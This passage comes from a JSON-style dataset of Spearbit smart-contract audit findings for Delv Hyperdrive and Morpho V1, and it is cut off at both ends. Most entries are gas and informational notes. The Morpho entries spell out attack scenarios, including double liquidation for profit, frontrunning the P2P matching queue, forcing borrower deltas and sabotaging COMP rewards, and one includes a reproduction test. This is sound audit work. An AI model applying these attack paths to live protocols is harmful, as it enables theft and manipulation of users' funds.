storage.", "labels": ["Spearbit", "Delv", "Severity: Gas Optimization"]}, {"title": "Squaring overflow check in _rpow can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "In the implementation of _rpow there is a check to make sure when squaring a number it would not overflow: let xx := mul(x, x) if iszero(eq(div(xx, x), x)) { revert(0, 0) }", "labels": ["Spearbit", "Delv", "Severity: Gas Optimization"]}, {"title": "StethHyperdrive...'s _pricePerShare() can be optimised", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "_pricePerShare() calls _lido twice: function _pricePerShare() internal view override returns (uint256 price) { return _lido.getTotalPooledEther().divDown(_lido.getTotalShares()); } Note using divDown since both the numerator and the denominator should have the same fixed precision the result would be in the 18 decimal fixed format.", "labels": ["Spearbit", "Delv", "Severity: Gas Optimization"]}, {"title": "Several math computations can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "There are several computations in the contract where the FixedMath library is used to first multiply by 1e18 and then divide by 1e18 again. One can either use the standard division operator or the 2-argument version of mulDivDown.  HyperdriveDataProvider.sol#L162: The deltaSum.divDown(deltaTime * 1e18) = deltaSum * 1e18 / (deltaTime * 1e18) computation is the same as deltaSum / deltaTime.  AaveHyperdrive.sol#L112: shares.mulDown(assets.divDown(totalShares_)) = shares * (assets * 1e18 / totalShares_) / 1e18 could be shares.mulDivDown(assets, totalShares_).  HyperdriveMath.sol#L70: To scale to one year, consider doing mulDivDown(365 days, _positionDura- tion). Currently, annualizedTime is first computed as an 1e18-based percentage value.  HyperdriveMath.sol#L97: FixedPointMath.ONE_18.mulDown(_timeStretch) is just _timeStretch.", "labels": ["Spearbit", "Delv", "Severity: Gas Optimization"]}, {"title": "Hardcoded default values can be set in declaration of state variables for tiny gas opts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "Hardcoded default values are not needed to be set in the constructor and therefore provide a tiny gas optimization (3) as an assignment is avoided: - uint256 public versionCounter; + uint256 public versionCounter = 1; // ... constructor( address _governance, IHyperdriveDeployer _deployer, address _hyperdriveGovernance, address _feeCollector, IHyperdrive.Fees memory _fees, address[] memory _defaultPausers, address _linkerFactory, bytes32 _linkerCodeHash ) { - governance = _governance; hyperdriveDeployer = _deployer; versionCounter = 1; Total in tests: Overall gas change: -18 (-0.000%)", "labels": ["Spearbit", "Delv", "Severity: Gas Optimization"]}, {"title": "unchecked blocks are more gas efficient where it can't overflow / underflow", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "unchecked blocks are more gas efficient as they don't include checks included since pragma version 0.8, therefore in calculations where overflow is not possible, unchecked blocks can be used to have better gas performance.", "labels": ["Spearbit", "Delv", "Severity: Gas Optimization"]}, {"title": "Prefix operator costs less gas than Postfix operator, especially when it's used in for-loops", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "Prefix operator costs less than postfix operator as it avoids an extra read, when used in for loops, this is even more noticed. After applying changes, general overall change on the tests it's notable. Overall gas change: -13252506 (-0.028%)", "labels": ["Spearbit", "Delv", "Severity: Gas Optimization"]}, {"title": "Not caching variables affects gas usage", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "Reading multiple times a storage variable is less gas efficient than caching the value in a local variable to avoid the extra gas usage on the SLOAD operations. Overall gas change: -16074 (-0.000%) Also some calculations can be cached:  HyperdriveLong.sol#L412: governanceCurveFee.divDown(_sharePrice) can be cached.", "labels": ["Spearbit", "Delv", "Severity: Gas Optimization"]}, {"title": "Last value can be considered rather than recording overflowed values at recordPrice", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "The last value can be compared to check if there has been an overflow after the calculation. If so, it can be chosen what to do regarding this case. The reverting option is not considered as said by the comment, however, other options such as recording the last calculated value can be chosen or even not recording a value altogether. // Calculate sum uint256 delta = block.timestamp - previousTime; // NOTE - We do not expect this should ever overflow under normal conditions // uint256 sum; unchecked { but if it would we would prefer that the oracle does not lock trade closes sum = price * delta + previousSum; }", "labels": ["Spearbit", "Delv", "Severity: Informational"]}, {"title": "longOpenSharePrice is not publicly exposed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "The longOpenSharePrice variable of the MarketState struct is not exposed to be publicly called via getPoolInfo function within HyperdriveDataProvider. This variable is used within _applyRemoveLiquidity to calculate the shareProceeds (proceeds released immediately when an LP removes liquidity). Exposing this variable will ease the interaction with the Hyperdriver by third parties or off-chain infrastructure that can be built around the Hyperdriver.", "labels": ["Spearbit", "Delv", "Severity: Informational"]}, {"title": "FixedPointMath's exp and _ln implementations needs to be verified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "Checking the correctness of exp and _ln could not fit into the timeline of this audit. Especially the parts that include approximating certain functions by rational functions and their coefficient derivations and the final scaling values need to be verified.", "labels": ["Spearbit", "Delv", "Severity: Informational"]}, {"title": "Due to division errors we might enter into the negative interest region when closing a short position", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "In this context when we apply the flat part of the close short trade we need to consider the case that due to division errors we might enter into the negative interest region here. Note that the error introduced is at most 1 (1 wei). The check for entering into the negative interest region only considers the curve part of the trade which happens before the adjustedShareReserves >= bondReserves line", "labels": ["Spearbit", "Delv", "Severity: Informational"]}, {"title": "0-interest is not allowed when opening a long or closing a short", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "In the above context when opening a long or closing a short we check that the updated ration y (cid:22)z > 1 which means that we are in the positive interest zone. Ending up on the 0 interest line is not allowed. Although the comment and the custom error name indicate that only negative interest points should be reverted. Also the check in _calculateOpenShort(...) only reverts if we are strictly in the negative interest zone and would allow the point to be on the 0-interest line.", "labels": ["Spearbit", "Delv", "Severity: Informational"]}, {"title": "Missing Natspec and comments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "Comments are key to understanding the codebase. In particular, Natspec comments provide rich documentation for functions, return variables and more. This documentation aids users, developers and auditors in understanding what the functions within the contract are meant to do. Some functions within the codebase have no Natspec (which in the case of interfaces can be later inherited using @inheritdoc).  Missing clarification comments:  FixedPointMath.sol#L182-L184:  Missing natspec: 54916777467707473351141471128 = b296 ln 2c  IERC20Mint.sol#L1-L10  IERC20Permit.sol#L38-L55  IERC4626.sol#L1-L152  IForwarderFactory.sol#L1-L8  IHyperdriveDeployer.sol#L1-L15  IHyperdriveRead.sol#L1-L29  IHyperdriveWrite.sol#L1-L73  ILido.sol#L1-L21  IMaker.sol#L1-L26  IMultiTokenMetadata.sol#L1-L7  IMultiTokenRead.sol#L1-L32  IMultiTokenWrite.sol#L1-L71  IWETH.sol#L1-L10  SafeCast.sol#L8-L12", "labels": ["Spearbit", "Delv", "Severity: Informational"]}, {"title": "Custom errors can be used for consistency, gas optimization and better debugging", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "In most parts of the code, there is heavy usage of custom errors when it comes to checks (i.e. AssetId.sol), while in SafeCast.sol, a require statement is used without an error message, an error message that would help at debugging. Instead of adding and using error strings (which are better for debugging and monitoring), custom errors could be used, which would reduce deployment and runtime costs and also add consistency. Additionally, ForwarderFactory.sol#L49 uses assert. Although it would revert as the other methods, it's generally used more in testing tools like Echidna and it will consume all gas rather than returning the remaining gas to the user.", "labels": ["Spearbit", "Delv", "Severity: Informational"]}, {"title": "Unused code should be removed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "The following imports are unused in:  HyperdriveTwap.sol import { Errors } from \"./libraries/Errors.sol\";  AssetId.sol import { FixedPointMath } from \"./FixedPointMath.sol\";  HyperdriveShort.sol import { YieldSpaceMath } from \"./libraries/YieldSpaceMath.sol\";  AaveHyperdriveDeployer.sol import { Errors } from \"../libraries/Errors.sol\";  YieldSpaceMath.sol have code that is not used within the base code: function calculateBondsInGivenSharesOut( uint256 z, uint256 y, uint256 dz, uint256 t, uint256 c, uint256 mu ) internal pure returns (uint256) {", "labels": ["Spearbit", "Delv", "Severity: Informational"]}, {"title": "FixedPointMath._ln(0) should revert", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "The FixedPointMath._ln function has this comment: // Intentionally allowing ln(0) to pass bc the function will return 0 // to pow() so that pow(0,1)=0 without a branch if (x < 0) revert Errors.FixedPointMath_NegativeInput(); However, this function does not return 0, _ln(0) = -46298671574056668922.", "labels": ["Spearbit", "Delv", "Severity: Informational"]}, {"title": "MultiToken transfer check inconsistencies", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "The MultiToken.batchTransferFrom function checks that the from and to parameters are non- zero. The transferFrom function does not perform these checks.", "labels": ["Spearbit", "Delv", "Severity: Informational"]}, {"title": "totalBase computation inconsistency for DsrHyperdrive.sol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "The DsrHyperdrive contract computes the totalBase in two different ways:  _deposit: uint256 totalBase = dsrManager.daiBalance(address(this));.  _pricePerShare: uint256 pie = dsrManager.pieOf(address(this)); and uint256 totalBase = pie.mulDivDown(chi(), RAY);.", "labels": ["Spearbit", "Delv", "Severity: Informational"]}, {"title": "_pricePerShare default value is 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "The default value of _pricePerShare() for a non-existent totalSupply is 0 for AaveHyperdrive and DsrHyperdrive.", "labels": ["Spearbit", "Delv", "Severity: Informational"]}, {"title": "Missing aToken and baseToken compatability check", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "When deploying an Aave Hyperdrive instance it is not checked if the provided aToken and the config's baseToken are compatible.", "labels": ["Spearbit", "Delv", "Severity: Informational"]}, {"title": "calculateBaseVolume can be removed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "When opening shorts, the base volume is computed as HyperdriveMath.calculateBaseVolume(_- shareReservesDelta.mulDown(_openSharePrice), _bondAmount, _timeRemaining). However, the _timeRe- maining parameter will always be 1e18 as shorts are always opened at max maturity time. Furthermore, on openShort HyperdriveShort.sol#L61 the timeRemaining will always be the maturityTime so the _calculateTimeRemaining can be skipped and timeRemaining replaced with 1e18.", "labels": ["Spearbit", "Delv", "Severity: Informational"]}, {"title": "Factory sets unnecessary max approvals to Hyperdrive", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "The HyperdriveFactory sets an infinite approval to the Hyperdrive deployment for the initial contribu- tion.", "labels": ["Spearbit", "Delv", "Severity: Informational"]}, {"title": "Typos and errors in comments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "There are typos and logical errors or ambiguity in the comments: fixed context recommendation fix PR/commit DsrHyperdriveFactory.sol#L30 manger ! manager ERC4626HyperdriveFactory.sol#L30 The Maker ERC4626 manger con- tract address. This looks like a copy and paste error, it's unclear how Maker is involved here, it should work with any ERC4626 vault. HASH HASH HyperdriveStorage.sol#L79 sun ! sum HASH 48 fixed context recommendation fix PR/commit HyperdriveShort.sol#L256 // Update the average maturity HASH HyperdriveBase.sol#L255 HyperdriveBase.sol#L287 HyperdriveLP.sol#L381 HyperdriveDataProvider.sol#L139- L145 IHyperdrive.sol#L23 MultiToken.sol#L20 HyperdriveMath.sol#L237 time of long positions. ! // Update the average maturity time of short positions. /// @param _amountIn The given amount in, either in terms of shares or bonds. ! /// @param _amountIn The given amount in, in terms of shares. /// @param _amountIn The given amount in, either in terms of shares or bonds. ! /// @param _amountIn /// @param _amountIn The given amount in, in terms of bonds. Consider naming the return parameter for the withdrawal shares for consis- tency. before the last ! before or at the targetTime. If the timestamp of the current index has older data than the target ! older or equal data The average maturity time of outstanding positions. This com- ment is ambiguous because it is the average maturity time multiplied by 1e18. renaming Consider PERMIT_TYPE- HASH to PERMIT_FOR_ALL_TYPEHASH as there's another prominent Per- mit(address spender,uint256 tokenId,uint256 nonce,uint256 deadline) function used in other protocols but PERMIT_TYPEHASH refers to the PermitForAll function that the MultiToken supports. Furthermore, _- approved is written with an underscore in the typehash which doesn't lead to issues but is rather unconventional. In calculateCloseShort, _amountOut is described as The amount of the asset that is received.. It's un- clear what is meant by this, it should be the bond amount that is being closed. HASH HASH HASH HASH HASH HASH HASH HyperdriveMath.sol#L349 and Hyper- driveMath.sol#L380 It should be 1 - p instead of p - 1. HASH 49 fixed context recommendation fix PR/commit HyperdriveMath.sol#L595 YieldSpaceMath.sol#L202-L205 YieldSpaceMath.sol#L264 ERC4626DataProvider.sol#L52 DsrHyperdriveDataProvider.sol#L85 StethHyperdrive.sol#L84 ERC4626DataProvider HyperdriveLP.sol#L273-L276 ERC20Forwarder.sol#L133 // proceeds = (c1 / c0 * c) * dy - dz ! // proceeds = (c1 / (c0 * c)) * dy - dz is desired. The phrasing of \"invariant must de- rive the same bond/base relation- ship through the redemption value (c)\" is confusing and is the op- We posite of what don't want an invariant such that for the interest rate stays constant bond/baseConvertedFromShares. (1 + r = y / (c*z) = y / x) We want the invariant to keep the bond/shares relationship the same, so the shares growing in value does not change the interest rate of the pool when no trades happen. (1 + r = y / ((cid:181) * z)). The link does not lead to a working ex- ample. The return (sharePrice); is obso- lete as sharePrice is already a named return parameter. The return (totalBase.divDown(_- should totalShares)); be (total- Base.divDown(_totalShares)); to keep a consistency of parameters usage. sharePrice = return // stETH instead of WETH. ! // stETH instead of ETH. should ERC4626HyperdriveDataProvider for consistency. be called uint256(withdrawalShares) on event emitting and return instruction are ob- solete as withdrawalShares is already uint256. @return True if transfer suc- cessful, false if not. The con- tract also reverts ! @return True if transfer successful. The contract reverts HASH HASH HASH HASH HASH HASH HASH HASH HASH HyperdriveFactory.sol#L138-L139 The new governor address ! The new fee collector address HASH 50 fixed context recommendation fix PR/commit HyperdriveFactory.sol#L156-L157 @notice Allows governance to change the fee collector address @notice Allows governance ! to change the default pausers and @param newDefaults The new governor address ! @param newDe- faults The new pausers FixedPointMath.sol#L183-L185 HyperdriveDataProvider.sol#L130 HyperdriveTWAP.sol#L21 and Hyper- driveDataProvider.sol#L130 HyperdriveBase.sol#L216 a that add 54916777467707473351141471128 = b296 ln 2c comment The average price in the smallest gap in the recorded sampled data which is bigger or equal to the provided period. The NatSpec comments need to be the price and more specific about mention that this is the spot price of bonds in terms of base. The endpoint of the range in this Nat- Spec comment needs to be updated to 1e18 or to make sure that it is conveyed that the 1 comes with 18 decimal fixed precision. latestCheckpoint, _matu- rityTime, _positionDuration are not in 1e18 format and thus the result will be due to using divDown. HASH HASH HASH HASH HASH", "labels": ["Spearbit", "Delv", "Severity: Informational"]}, {"title": "Constant ONE_18 should be used instead of 1e18", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "In the code, constant ONE_18 is declared for 1e18. However it is unused sometimes. Declaring a constant is a good practice to avoid using hardcoded numbers. These numbers typically are saved in a variable, so it's easier to read an update them if needed. Additionally, in these files FixedPointMath library can be imported, so these 3 can also be substituted by the constant variable:  HyperdriveStorage.sol#L114  HyperdriveStorage.sol#L115  HyperdriveStorage.sol#L116", "labels": ["Spearbit", "Delv", "Severity: Informational FixedPointMath.sol#L71, FixedPoint- FixedPointMath.sol#L79,"]}, {"title": "type(uint256).max can be used to keep consistency", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "Consistency helps both readability and maintainability. type(uint256).max is used within the code multiple times, however, for getting the same value is also used 2 ** 256 - 1;", "labels": ["Spearbit", "Delv", "Severity: Informational"]}, {"title": "Lack of events affects transparency and monitoring.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "The absence of events in crucial functions, particularly those with privileged access, hinders trans- parency and makes monitoring more difficult. Users and the protocol team itself may encounter unexpected changes resulting from these functions, without the ability to observe the corresponding events.", "labels": ["Spearbit", "Delv", "Severity: Informational"]}, {"title": "Liquidating Morpho's Aave position leads to state desync", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Morpho has a single position on Aave that encompasses all of Morpho's individual user positions that are on the pool. When this Aave Morpho position is liquidated the user position state tracked in Morpho desyncs from the actual Aave position. This leads to issues when users try to withdraw their collateral or repay their debt from Morpho. It's also possible to double-liquidate for a profit. Example: There's a single borrower B1 on Morpho who is connected to the Aave pool. B1 supplies 1 ETH and borrows 2500 DAI. This creates a position on Aave for Morpho The ETH price crashes and the position becomes liquidatable. A liquidator liquidates the position on Aave, earning the liquidation bonus. They repaid some debt and seized some collateral for profit. This repaid debt / removed collateral is not synced with Morpho. The user's supply and debt balance remain 1 ETH and 2500 DAI. The same user on Morpho can be liquidated again because Morpho uses the exact same liquidation parameters as Aave. The Morpho liquidation call again repays debt on the Aave position and withdraws collateral with a second liquidation bonus. The state remains desynced.", "labels": ["Spearbit", "MorphoV1", "Severity: High Risk"]}, {"title": "A market could be deprecated but still prevent liquidators to liquidate borrowers if isLiquidateBor- rowPaused is true", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Currently, when a market must be deprecated, Morpho checks that borrowing has been paused before applying the new value for the flag. function setIsDeprecated(address _poolToken, bool _isDeprecated) external onlyOwner isMarketCreated(_poolToken) { } if (!marketPauseStatus[_poolToken].isBorrowPaused) revert BorrowNotPaused(); marketPauseStatus[_poolToken].isDeprecated = _isDeprecated; emit IsDeprecatedSet(_poolToken, _isDeprecated); The same check should be done in isLiquidateBorrowPaused, allowing the deprecation of a market only if isLiq- uidateBorrowPaused == false otherwise liquidators would not be able to liquidate borrowers on a deprecated market.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "setIsPausedForAllMarkets bypass the check done in setIsBorrowPaused and allow resuming borrow on a deprecated market", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The MorphoGovernance contract allow Morpho to set the isBorrowPaused to false only if the market is not deprecated. function setIsBorrowPaused(address _poolToken, bool _isPaused) external onlyOwner isMarketCreated(_poolToken) { } if (!_isPaused && marketPauseStatus[_poolToken].isDeprecated) revert MarketIsDeprecated(); marketPauseStatus[_poolToken].isBorrowPaused = _isPaused; emit IsBorrowPausedSet(_poolToken, _isPaused); This check is not enforced by the _setPauseStatus function, called by setIsPausedForAllMarkets allowing Mor- pho to resume borrowing for deprecated market. Test to reproduce the issue // SPDX-License-Identifier: AGPL-3.0-only pragma solidity ^0.8.0; import \"./setup/TestSetup.sol\"; contract TestSpearbit is TestSetup { using WadRayMath for uint256; function testBorrowPauseCheckSkipped() public { // Deprecate a market morpho.setIsBorrowPaused(aDai, true); morpho.setIsDeprecated(aDai, true); checkPauseEquality(aDai, true, true); // you cannot resume the borrowing if the market is deprecated hevm.expectRevert(abi.encodeWithSignature(\"MarketIsDeprecated()\")); morpho.setIsBorrowPaused(aDai, false); checkPauseEquality(aDai, true, true); // but this check is skipped if I call directly `setIsPausedForAllMarkets` morpho.setIsPausedForAllMarkets(false); // this should revert because // you cannot resume borrowing for a deprecated market checkPauseEquality(aDai, false, true); } function checkPauseEquality( address aToken, bool shouldBePaused, 6 bool shouldBeDeprecated ) public { ( bool isSupplyPaused, bool isBorrowPaused, bool isWithdrawPaused, bool isRepayPaused, bool isLiquidateCollateralPaused, bool isLiquidateBorrowPaused, bool isDeprecated ) = morpho.marketPauseStatus(aToken); assertEq(isBorrowPaused, shouldBePaused); assertEq(isDeprecated, shouldBeDeprecated); } }", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "User withdrawals can fail if Morpho position is close to liquidation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "When trying to withdraw funds from Morpho as a P2P supplier the last step of the withdrawal algorithm borrows an amount from the pool (\"hard withdraw\"). If the Morpho position on Aave's debt / collateral value is higher than the market's max LTV ratio but lower than the market's liquidation threshold, the borrow will fail and the position can also not be liquidated. The withdrawals could fail.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "P2P borrowers' rate can be reduced", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Users on the pool currently earn a much worse rate than users with P2P credit lines. There's a queue for being connected P2P. As this queue could not be fully processed in a single transaction the protocol introduces the concept of a max iteration count and a borrower/supplier \"delta\" (c.f. yellow paper). This delta leads to a worse rate for existing P2P users. An attacker can force a delta to be introduced, leading to worse rates than before. Example: Imagine some borrowers are matched P2P (earning a low borrow rate), and many are still on the pool and therefore in the pool queue (earning a worse borrow rate from Aave).  An attacker supplies a huge amount, creating a P2P credit line for every borrower. (They can repeat this step several times if the max iterations limit is reached.) 7  The attacker immediately withdraws the supplied amount again. The protocol now attempts to demote the borrowers and reconnect them to the pool. But the algorithm performs a \"hard withdraw\" as the last step if it reaches the max iteration limit, creating a borrower delta. These are funds borrowed from the pool (at a higher borrowing rate) that are still wrongly recorded to be in a P2P position for some borrowers. This increase in borrowing rate is socialized equally among all P2P borrowers. (reflected in an updated p2pBorrowRate as the shareOfDelta increased.)  The initial P2P borrowers earn a worse rate than before. If the borrower delta is large, it's close to the on-pool rate.  If an attacker-controlled borrower account was newly matched P2P and not properly reconnected to the pool (in the \"demote borrowers\" step of the algorithm), they will earn a better P2P rate than the on-pool rate they earned before.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk Original"]}, {"title": "Frontrunners can exploit system by not allowing head of DLL to match in P2P", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "For a given asset x, liquidity is supplied on the pool since there are not enough borrowers. suppli- ersOnPool head: 0xa with 1000 units of x whenever there is a new transaction in the mempool to borrow 100 units of x,  Frontrunner supplies 1001 units of x and is supplied on pool.  updateSuppliers will put the frontrunner on the head (assuming very high gas is supplied).  Borrower's transaction lands and is matched 100 units of x with a frontrunner in p2p.  Frontrunner withdraws the remaining 901 left which was on the underlying pool. Favorable conditions for an attack:  Relatively fewer gas fees & relatively high block gas limit.  insertSorted is able to traverse to head within block gas limit (i.e length of DLL). Since this is a non-atomic sandwich, the frontrunner needs excessive capital for a block's time period.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "Differences between Morpho and Compound borrow validation logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between them;  Compound has a mechanism to prevent borrows if the new borrowed amount would go above the current borrowCaps[cToken] threshold. Morpho does not check this threshold and could allow users to borrow on the P2P side (avoiding the revert because it would not trigger the underlying compound borrow action). Morpho should anyway monitor the borrowCaps of the market because it could make increaseP2PDeltasLogic and _unsafeWithdrawLogic reverts.  Both Morpho and Compound do not check if a market is in \"deprecated\" state. This means that as soon as a user borrows some tokens, he/she can be instantly liquidated by another user.  If the flag is true on Compound, the Morpho User can be liquidated directly on compound.  If the flag is true on Morpho, the borrower can be liquidated on Morpho.  Morpho does not check if borrowGuardianPaused[cToken] on Compound, a user could be able to borrow in P2P while the cToken market has borrow paused. More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Compound\".", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "Users can continue to borrow from a deprecated market", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "When a market is being marked as deprecated, there is no verification that the borrow for that market has already been disabled. This means a user could borrow from this market and immediately be eligible to be liquidated.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "ERC20 with transfer's fee are not handled by *PositionManager", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Some ERC20 tokens could have fees attached to the transfer event, while others could enable them in the future (see USDT, USDC). The current implementation of both PositionManager (for Aave and Compound) is not taking into consideration these types of ERC20 tokens. While Aave seems not to take into consideration this behavior (see LendingPool.sol), Compound, on the other hand, is explicitly handling it inside the doTransferIn function. Morpho is taking for granted that the amount specified by the user will be the amount transferred to the contract's balance, while in reality, the contract will receive less. In supplyLogic, for example, Morpho will account for the user's p2p/pool balance for the full amount but will repay/supply to the pool less than the amount accounted for.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "Cannot liquidate Morpho users if no liquidity on the pool", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Morpho implements liquidations by repaying the borrowed asset and then withdrawing the collateral If there is no liquidity in the collateral asset pool the asset from the underlying protocol (Aave / Compound). liquidation will fail. Morpho could incur bad debt as they cannot liquidate the user. The liquidation mechanisms of Aave and Compound work differently: They allow the liquidator to seize the debtorsTokens/cTokens which can later be withdrawn for the underlying token once there is enough liquidity in the pool. Technically, an attacker could even force no liquidity on the pool by frontrunning liquidations by borrowing the entire pool amount - preventing them from being liquidated on Morpho. However, this would require significant capital as collateral in most cases.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "Supplying and borrowing can recreate p2p credit lines even if p2p is disabled", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "When supplying/borrowing the algorithm tries to reduce the deltas p2pBorrowDelta/p2pSupplyDelta by moving borrowers/suppliers back to P2P. It is not checked if P2P is enabled. This has some consequences related to when governance disables P2P and wants to put users and liquidity back on the pool through increaseDelta calls. The users could enter P2P again by supplying and borrowing.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "In Compound implementation, P2P indexes can be stale", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The current implementation of MorphoUtils._isLiquidatable loops through all of the tokens in which the user has supplied to/borrowed from. The scope of the function is to check whether the user can be liquidated or not by verifying that debtValue > maxDebtValue. Resolving \"Compound liquidity computation uses outdated cached borrowIndex\" implies that the Compound bor- row index used is always up-to-date but the P2P issues associated with the token could still be out of date if the market has not been used recently, and the underlying Compound indexes (on which the P2P index is based) has changed a lot. As a consequence, all the functions that rely on _isLiquidatable (liquidate, withdraw, borrow) could return a wrong result if the majority of the user's balance is on the P2P balance (the problem is even more aggravated without resolving \"Compound liquidity computation uses outdated cached borrowIndex\". Let's say, for example:  Alice supplies ETH in pool  Alice supplies BAT in P2P  Alice borrows some DAI At some point in time the ETH value goes down, but the interest rate of BAT goes up. If the P2P index of BAT had been correctly up-to-date, Alice would have been still solvent, but she gets liquidated by Bob who calls liq- uidate(alice, ETH, DAI) Even by fixing \"Compound liquidity computation uses outdated cached borrowIndex\" Alice would still be liquidated because her entire collateral is on P2P and not in the pool.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "Turning off an asset as collateral on Morpho-Aave still allows seizing of that collateral on Morpho and leads to liquidations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The Morpho Aave deployment can set the asset to not be used as collateral for Aave's Morpho contract position. On Aave, this prevents liquidators from seizing this asset as collateral. 1. However, this prevention does not extend to users on Morpho as Morpho has not implemented this check. Liquidations are performed through a repay & withdraw combination and withdrawing the asset on Aave is still allowed. 2. When turning off the asset as collateral, the single Morpho contract position on Aave might still be over- collateralized, but some users on Morpho suddenly lose this asset as collateral (LTV becomes 0) and will be liquidated.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "claimToTreasury(COMP) steals users' COMP rewards", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The claimToTreasury function can send a market's underlying tokens that have been accumulated in the contract to the treasury. This is intended to be used for the reserve amounts that accumulate in the contract from P2P matches. However, Compound also pays out rewards in COMP and COMP is a valid Compound market. Sending the COMP reserves will also send the COMP rewards. This is especially bad as anyone can claim COMP rewards on the behalf of Morpho at any time and the rewards will be sent to the contract. An attacker could even frontrun a claimToTreasury(cCOMP) call with a Comptroller.claimComp(morpho, [cComp]) call to sabotage the reward system. Users won't be able to claim their rewards.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "Compound liquidity computation uses outdated cached borrowIndex", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The _isLiquidatable 